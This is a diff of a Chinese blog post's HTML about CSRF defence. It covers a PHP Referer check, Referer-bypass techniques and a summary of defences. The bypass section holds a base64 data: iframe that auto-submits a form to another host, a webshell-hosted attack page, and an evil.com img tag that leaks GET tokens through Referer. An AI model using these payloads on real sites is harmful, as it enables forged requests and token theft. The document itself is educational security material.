@@ -38,7 +38,7 @@
 <meta property="og:image" content="https://z0sen.xyz/archives/24515/csrf-defense-mod.png">
 <meta property="og:image" content="https://z0sen.xyz/archives/24515/php-data.png">
 <meta property="article:published_time" content="2020-10-22T09:30:17.000Z">
-<meta property="article:modified_time" content="2020-10-22T13:50:53.340Z">
+<meta property="article:modified_time" content="2020-10-22T14:03:23.844Z">
 <meta property="article:author" content="z0sen">
 <meta property="article:tag" content="CSRF">
 <meta name="twitter:card" content="summary">
@@ -263,7 +263,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2020-10-22 17:30:17 / 修改时间：21:50:53" itemprop="dateCreated datePublished" datetime="2020-10-22T17:30:17+08:00">2020-10-22</time>
+              <time title="创建时间：2020-10-22 17:30:17 / 修改时间：22:03:23" itemprop="dateCreated datePublished" datetime="2020-10-22T17:30:17+08:00">2020-10-22</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -366,17 +366,13 @@
 <h2 id="0x02-使用Referer进行CSRF防御"><a href="#0x02-使用Referer进行CSRF防御" class="headerlink" title="0x02 使用Referer进行CSRF防御"></a>0x02 使用Referer进行CSRF防御</h2><p>在PHP中使用<code>$_SERVER[&#39;HTTP_REFERER&#39;]</code>获取页面提交请求中的Referer值<br>这里需要用到一个strpos函数，用法参考 <span class="exturl" data-url="aHR0cHM6Ly93d3cudzNzY2hvb2wuY29tLmNuL3BocC9mdW5jX3N0cmluZ19zdHJwb3MuYXNw">PHP strpos() 函数-w3c<i class="fa fa-external-link-alt"></i></span><br>附上防御代码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$referer &#x3D; $_SERVER[&quot;HTTP_REFERER&quot;];</span><br><span class="line">	if(strpos($referer,&quot;192.168.150.1&quot;) !&#x3D;&#x3D; false)</span><br><span class="line">	&#123;</span><br><span class="line">		echo $_SERVER[&quot;HTTP_REFERER&quot;];</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;successful&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		echo $_SERVER[&quot;HTTP_REFERER&quot;];</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;fail&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <p>strpos函数里面的意思也就是在获取的Referer值里面是否包含192.168.150.1这个域名，如果包含了说明是正确的，没包含就可能是恶意的</p>
-<h2 id="0x03-Referer-绕过"><a href="#0x03-Referer-绕过" class="headerlink" title="0x03 Referer 绕过"></a>0x03 Referer 绕过</h2><h3 id="1-Refere为空条件下"><a href="#1-Refere为空条件下" class="headerlink" title="1.Refere为空条件下"></a>1.Refere为空条件下</h3><pre><code>利用ftp://，http://，https://，file://，javascript:，data:，比如这个时候浏览器地址栏是 file:// 开头的，这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。</code></pre>
-<p>例：<br>① 利用<code>data:</code>协议</p>
-<pre><code>    &lt;html&gt;
-        &lt;body&gt;
-           &lt;iframe src=&quot;data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==&quot;&gt;
-        &lt;/body&gt; 
-    &lt;/html&gt;</code></pre>
-<p>② 利用<code>https</code>协议<br>    https向http跳转的时候Referer为空<br>    拿一个https的webshell<br>    <code>&lt;iframe src=&quot;https://www.xxxx.com/attack.php&quot;&gt;</code><br>    attack.php写上CSRF攻击代码</p>
-<h3 id="2-判断Referer是某域情况下绕过"><a href="#2-判断Referer是某域情况下绕过" class="headerlink" title="2.判断Referer是某域情况下绕过"></a>2.判断Referer是某域情况下绕过</h3><pre><code>比如你找的csrf是 `xxx.com`，验证的referer是验证的 `*.xx.com`，可以找个二级域名之后 `&lt;img &quot;csrf地址&quot;&gt;` 之后在把地址发出去就可以伪造。</code></pre>
-<h3 id="3-判断Referer是否存在某关键词"><a href="#3-判断Referer是否存在某关键词" class="headerlink" title="3.判断Referer是否存在某关键词"></a>3.判断Referer是否存在某关键词</h3><pre><code>Referer判断存在不存在`google.com`这个关键词，在网站新建一个`google.com`文件夹，把CSRF PoC存放在`google.com`目录，即可绕过。</code></pre>
-<h3 id="4-判断referer是否有某域名"><a href="#4-判断referer是否有某域名" class="headerlink" title="4.判断referer是否有某域名"></a>4.判断referer是否有某域名</h3><pre><code>判断了Referer开头是否以`126.com`以及126子域名  不验证根域名为 `126.com` 那么我这里可以构造子域名 `x.126.com.xxx.com` 作为蠕虫传播的载体服务器，即可绕过。</code></pre>
+<h2 id="0x03-Referer-绕过"><a href="#0x03-Referer-绕过" class="headerlink" title="0x03 Referer 绕过"></a>0x03 Referer 绕过</h2><h3 id="1-Refere为空条件下"><a href="#1-Refere为空条件下" class="headerlink" title="1.Refere为空条件下"></a>1.Refere为空条件下</h3><p>利用ftp://，http://，https://，file://，javascript:，data:，比如这个时候浏览器地址栏是 file:// 开头的，这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。<br>例：<br>① 利用<code>data:</code>协议</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">	    &lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg&#x3D;&#x3D;&quot;&gt;</span><br><span class="line">	&lt;&#x2F;body&gt; </span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>② 利用<code>https</code>协议<br>    https向http跳转的时候Referer为空<br>    拿一个https的webshell<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;https:&#x2F;&#x2F;www.xxxx.com&#x2F;attack.php&quot;&gt;</span><br></pre></td></tr></table></figure><br>    attack.php写上CSRF攻击代码</p>
+<h3 id="2-判断Referer是某域情况下绕过"><a href="#2-判断Referer是某域情况下绕过" class="headerlink" title="2.判断Referer是某域情况下绕过"></a>2.判断Referer是某域情况下绕过</h3><p>比如你找的csrf是 <code>xxx.com</code>，验证的referer是验证的 <code>*.xx.com</code>，可以找个二级域名之后 <code>&lt;img &quot;csrf地址&quot;&gt;</code> 之后在把地址发出去就可以伪造。</p>
+<h3 id="3-判断Referer是否存在某关键词"><a href="#3-判断Referer是否存在某关键词" class="headerlink" title="3.判断Referer是否存在某关键词"></a>3.判断Referer是否存在某关键词</h3><p>Referer判断存在不存在<code>google.com</code>这个关键词，在网站新建一个<code>google.com</code>文件夹，把CSRF PoC存放在<code>google.com</code>目录，即可绕过。</p>
+<h3 id="4-判断referer是否有某域名"><a href="#4-判断referer是否有某域名" class="headerlink" title="4.判断referer是否有某域名"></a>4.判断referer是否有某域名</h3><p>判断了Referer开头是否以<code>126.com</code>以及126子域名  不验证根域名为 <code>126.com</code> 那么我这里可以构造子域名 <code>x.126.com.xxx.com</code> 作为蠕虫传播的载体服务器，即可绕过。</p>
 <h1 id="五、CSRF漏洞防御总结"><a href="#五、CSRF漏洞防御总结" class="headerlink" title="五、CSRF漏洞防御总结"></a>五、CSRF漏洞防御总结</h1><h2 id="0x01-验证码"><a href="#0x01-验证码" class="headerlink" title="0x01 验证码"></a>0x01 验证码</h2><p>验证码防御被认为是对抗CSRF最为简单而且有效的防御方法。<br>CSRF在用户不知情的情况下完成对应操作，而验证码强制用户与应用程序交互，才能最终完成操作。通常情况下，验证码能够很好的遏制CSRF。<br>但出于用户体验考虑，不可能每一个操作都加入验证码，所以验证码只作为辅助手段，不能作为防御CSRF的主要解决方案。</p>
 <ul>
 <li>验证码防御也可以被认为是二次验证</li>
@@ -384,7 +380,7 @@
 <h2 id="0x02-Referer-Check"><a href="#0x02-Referer-Check" class="headerlink" title="0x02 Referer Check"></a>0x02 Referer Check</h2><p>Referer Check主要用于防止盗链。同理也可以用来检查请求是否来自合法的“源”。<br>比如用户修改密码，一定是在登录系统后台之后进行操作，所以在修改提交表单的时候，一定会从系统后台页面提交，携带Referer头，如果Referer不是当前系统的域，那么极有可能遭受CSRF。</p>
 <p>缺陷：服务器并非任何时候都可以取到Referer。例如HTTPS跳转到HTTP。</p>
 <h2 id="0x03-Anti-CSRF-Token"><a href="#0x03-Anti-CSRF-Token" class="headerlink" title="0x03 Anti CSRF Token"></a>0x03 Anti CSRF Token</h2><p>CSRF本质原因：重要操作的所有参数都是被恶意攻击者猜测到的。<br>那么防御措施就是生成一个随机且不被轻易猜测的参数，目前大多数防御都采用不可预测的token值。</p>
-<p>缺陷：Token泄露<br>1.GET型Token泄露<br>例如：GET型Token泄露<br>页面包含 <code>&lt;img src=&quot;http://www.evil.com/&quot;/&gt;</code> 那么请求中的Referer就会携带对应的GET Token。</p>
+<p>缺陷：Token泄露<br>1.GET型Token泄露<br>页面包含 <code>&lt;img src=&quot;http://www.evil.com/&quot;/&gt;</code> 那么请求中的Referer就会携带对应的GET Token。</p>
 <p>2.POST型Token泄露<br>利用XSS漏洞获取其Cookie，查看存储在其中的Token值。</p>
 
     </div>
